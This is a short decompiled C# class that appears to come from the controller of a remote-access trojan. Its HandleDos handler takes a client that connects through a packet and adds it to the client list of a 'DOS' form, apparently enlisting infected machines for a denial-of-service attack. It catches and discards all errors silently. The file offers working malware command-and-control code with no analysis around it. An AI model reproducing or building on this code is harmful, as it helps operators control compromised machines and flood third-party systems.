using System;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200005D RID: 93
	internal class HandleDos
	{
		// Token: 0x060002DA RID: 730 RVA: 0x0001E5B0 File Offset: 0x0001C7B0
		public void Add(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				FormDOS formDOS = (FormDOS)Application.OpenForms["DOS"];
				if (formDOS != null)
				{
					object sync = formDOS.sync;
					lock (sync)
					{
						formDOS.PlguinClients.Add(client);
					}
				}
			}
			catch
			{
			}
		}
	}
}
